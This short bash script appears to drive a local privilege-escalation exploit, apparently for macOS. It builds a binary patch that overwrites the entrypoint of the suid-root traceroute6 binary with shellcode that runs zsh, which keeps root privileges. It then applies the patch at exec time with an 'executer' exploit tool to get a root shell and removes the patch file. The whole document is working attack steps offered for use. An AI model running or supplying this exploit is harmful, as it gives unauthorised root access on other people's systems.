#!/bin/bash

# build a binary patch to apply to traceroute6 (a suid-root binary, any will do though*) which overwrites
# its entrypoint with shellcode to exec /bin/zsh (not bash! bash will drop the euid 0)
python build_exec_patch.py `which traceroute6` `which zsh` traceroute6_exec_shell.binpatch

# use the exploit to apply that patch at exec time to the suid-root binary
./executer -p traceroute6_exec_shell.binpatch -o `which traceroute6` -- `which traceroute6` -invalid

# cleanup

rm -rf traceroute6_exec_shell.binpatch

# * if you choose a fat binary pass a lipo'ed thin version to -o
